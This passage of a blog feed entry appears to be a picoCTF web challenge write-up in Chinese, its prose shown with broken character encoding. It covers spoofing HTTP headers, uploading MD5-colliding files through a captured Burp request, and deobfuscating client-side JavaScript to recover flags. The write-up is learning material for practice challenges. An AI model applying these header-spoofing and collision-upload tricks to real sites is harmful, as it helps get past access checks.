ç·¨ç¢¼å¾Œéçš„æ±è¥¿ï¼Œä¸Šä¸‹å…©è¡Œä¸å¤ªçŸ¥é“æ˜¯ä»€éº¼ï¼Œä¸­é–“é‚£è¡Œè§£å‡ºä¾†æ˜¯<code>js/myfile.txt</code> ï¼Œæ‰€ä»¥å°±å»çœ‹ <code>js/myfile.txt</code>å°±å¾—åˆ° Flag äº†</p><figure><img data-src="https://i.imgur.com/zdJtIB2.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/acGFowS.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/HdWPVny.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å››é¡Œwho-are-you">ç¬¬å››é¡Œï¼šWho are you? <a href="#ç¬¬å››é¡Œwho-are-you" class="headerlink"></a></h3><p>é€™é¡Œå¾ˆå¥½ç©ï¼Œä»–æ˜¯æ˜¨å¤©æŠŠ <code>User-Agent</code> æ”¹æˆ<code>picobrowser</code>çš„é€²éšç‰ˆï¼Œé€™æ¬¡è¦æ”¹çš„æ±è¥¿æ›´å¤šï¼Œä½†ä»–éƒ½æœ‰çµ¦æç¤ºï¼Œæ…¢æ…¢æŸ¥ä¸€å€‹å€‹åŠ åˆ° Headerè£¡é¢å°±å®Œæˆäº†ï¼Œåˆ†åˆ¥æ˜¯ <code>User-Agent</code> <code>Referer</code><code>Date</code> <code>DNT</code> <code>X-Forwarded-For</code><code>Accept-Language</code> ï¼Œé€™äº›éƒ½æ”¹æˆä»–æƒ³è¦çš„ä¹‹å¾Œå°±èƒ½å¾—åˆ° Flagäº†</p><figure><img data-src="https://i.imgur.com/D0TWN28.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/aGCEPCf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/jxwsbkn.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KYHVMt.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/gUxGPKj.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/6xnFkJB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/P6e6nSb.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/rVhV8iN.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äº”é¡Œit-is-my-birthday">ç¬¬äº”é¡Œï¼šIt is my Birthday <a href="#ç¬¬äº”é¡Œit-is-my-birthday" class="headerlink"></a></h3><p>é€™é¡Œæ˜¯è¦ä¸Šå‚³å…©å€‹ PDFï¼Œè¦æ»¿è¶³å…§å®¹ä¸ç›¸åŒï¼Œä½†æ˜¯ MD5 Hashç›¸åŒï¼Œæ‰€ä»¥æˆ‘å…ˆç”¨ Burp Suite æŠŠè«‹æ±‚æŠ“ä¸‹ä¾†ï¼Œç„¶å¾Œä¸Šç¶²æ‰¾åˆ°å…©å€‹æœƒç¢°æ’çš„ MD5Hash :<code>TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</code>å’Œ<code>TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</code>ï¼Œä¸¦åˆ†åˆ¥æŠŠä»–å€‘ç•¶æˆPDF çš„å…§å®¹ï¼Œä¸Šå‚³ä¸Šå»ä¹‹å¾Œå°±èƒ½å¾—åˆ° Flag äº†</p><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>mercury.picoctf.net:57247</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>575</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.9</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://mercury.picoctf.net:57247</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryvOuQVRQUS71gBftB</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://mercury.picoctf.net:57247/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="file1"; filename="test.pdf"</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="file2"; filename="test.pdf"</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>="submit"</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">Upload</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryvOuQVRQUS71gBftB--</span></span></span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/Rf6b5uB.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/TiVm1g4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å…­é¡Œ">ç¬¬å…­é¡Œï¼š <a href="#ç¬¬å…­é¡Œ" class="headerlink"></a></h3><p>ç¶²é ä¸­çš„ js è¢« <code>obfuscation</code> äº†ï¼Œæœ‰å¤ é†œï¼Œå…ˆæ‹¿ prettieræ ¼å¼åŒ–ï¼Œå†ä»”ç´°çœ‹çœ‹ï¼Œæ„Ÿè¦ºè·Ÿä¹‹å‰æœ‰ä¸€é¡Œ <code>dont-use-client-side</code>å¾ˆåƒï¼Œä½†å¾ˆå¤šæ±è¥¿è¢«æ‰“äº‚äº†ï¼Œä¸éå¯ä»¥å¾<code>checkpass[_0x4b5b("0x2")](, )</code> åˆ¤æ–·å‡ºå¯†ç¢¼çš„é †åºæ˜¯<code>_0x4b5b("0x3")</code> -&gt; <code>_0x4b5b("0x4")</code> -&gt;<code>_0x4b5b("0x6")</code> -&gt;<code>_0x4b5b("0x5")</code>ï¼ŒæŠŠå®ƒå°å‡ºä¾†ä¹‹å¾Œå°±æ˜¯ Flag äº†ï½</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x5a46 = [</span><br><span class="line">  <span class="string">"0a029}"</span>,</span><br><span class="line">  <span class="string">"_again_5"</span>,</span><br><span class="line">  <span class="string">"this"</span>,</span><br><span class="line">  <span class="string">"Password\x20Verified"</span>,</span><br><span class="line">  <span class="string">"Incorrect\x20password"</span>,</span><br><span class="line">  <span class="string">"getElementById"</span>,</span><br><span class="line">  <span class="string">"value"</span>,</span><br><span class="line">  <span class="string">"substring"</span>,</span><br><span class="line">  <span class="string">"picoCTF{"</span>,</span><br><span class="line">  <span class="string">"not_this"</span>,</span><br><span class="line">];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0x4bd822, _0x2bd6f7</span>) {</span><br><span class="line">  <span class="keyword">var</span> _0xb4bdb3 = <span class="keyword">function</span> (<span class="params">_0x1d68f6</span>) {</span><br><span class="line">    <span class="keyword">while</span> (--_0x1d68f6) {</span><br><span class="line">      _0x4bd822[<span class="string">"push"</span>](_0x4bd822[<span class="string">"shift"</span>]());</span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line">  <span class="title function_">_0xb4bdb3</span>(++_0x2bd6f7);</span><br><span class="line">})(_0x5a46, <span class="number">0x1b3</span>);</span><br><span class="line"><span class="keyword">var</span> _0x4b5b = <span class="keyword">function</span> (<span class="params">_0x2d8f05, _0x4b81bb</span>) {</span><br><span class="line">  _0x2d8f05 = _0x2d8f05 - <span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">var</span> _0x4d74cb = _0x5a46[_0x2d8f05];</span><br><span class="line">  <span class="keyword">return</span> _0x4d74cb;</span><br><span class="line">};</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params"></span>) {</span><br><span class="line">  checkpass = <span class="variable language_">document</span>[<span class="title function_">_0x4b5b</span>(<span class="string">"0x0"</span>)](<span class="string">"pass"</span>)[<span class="title function_">_0x4b5b</span>(<span class="string">"0x1"</span>)];</span><br><span class="line">  split = <span class="number">0x4</span>;</span><br><span class="line">  <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x0</span>, split * <span class="number">0x2</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x3"</span>)) {</span><br><span class="line">    <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x7</span>, <span class="number">0x9</span>) == <span class="string">"{n"</span>) {</span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line">        checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](split * <span class="number">0x2</span>, split * <span class="number">0x2</span> * <span class="number">0x2</span>) ==</span><br><span class="line">        <span class="title function_">_0x4b5b</span>(<span class="string">"0x4"</span>)</span><br><span class="line">      ) {</span><br><span class="line">        <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0x3</span>, <span class="number">0x6</span>) == <span class="string">"oCT"</span>) {</span><br><span class="line">          <span class="keyword">if</span> (</span><br><span class="line">            checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](split * <span class="number">0x3</span> * <span class="number">0x2</span>, split * <span class="number">0x4</span> * <span class="number">0x2</span>) ==</span><br><span class="line">            <span class="title function_">_0x4b5b</span>(<span class="string">"0x5"</span>)</span><br><span class="line">          ) {</span><br><span class="line">            <span class="keyword">if</span> (checkpass[<span class="string">"substring"</span>](<span class="number">0x6</span>, <span class="number">0xb</span>) == <span class="string">"F{not"</span>) {</span><br><span class="line">              <span class="keyword">if</span> (</span><br><span class="line">                checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](</span><br><span class="line">                  split * <span class="number">0x2</span> * <span class="number">0x2</span>,</span><br><span class="line">                  split * <span class="number">0x3</span> * <span class="number">0x2</span>,</span><br><span class="line">                ) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x6"</span>)</span><br><span class="line">              ) {</span><br><span class="line">                <span class="keyword">if</span> (checkpass[<span class="title function_">_0x4b5b</span>(<span class="string">"0x2"</span>)](<span class="number">0xc</span>, <span class="number">0x10</span>) == <span class="title function_">_0x4b5b</span>(<span class="string">"0x7"</span>)) {</span><br><span class="line">                  <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">"0x8"</span>));</span><br><span class="line">                }</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="title function_">alert</span>(<span class="title function_">_0x4b5b</span>(<span class="string">"0x9"</span>));</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure><img data-src="https://i.imgur.com/Er686nJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;6 é¡Œ web&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
</feed>
